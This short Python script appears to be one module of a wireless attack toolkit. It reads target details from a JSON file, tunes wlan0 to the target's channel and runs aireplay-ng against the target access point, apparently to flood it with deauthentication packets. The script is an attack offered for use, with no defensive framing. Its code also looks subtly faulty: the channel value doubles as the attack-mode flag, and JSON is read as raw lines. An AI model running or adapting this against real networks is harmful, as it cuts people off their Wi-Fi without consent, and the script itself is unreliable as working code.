import os

# Capture Target Information
module_input_file_path = os.path.dirname(__file__) + "/../modules/module_input_data.json"
target_information = None

with open(module_input_file_path, "r") as f:
    target_information = f.readlines()
    
##################
## START MODULE ##
##################

os.system(f"iwconfig wlan0 channel {target_information[4]}")
os.system(f"aireplay-ng -{target_information[4]} {10000} -a {target_information[2]} wlan0")
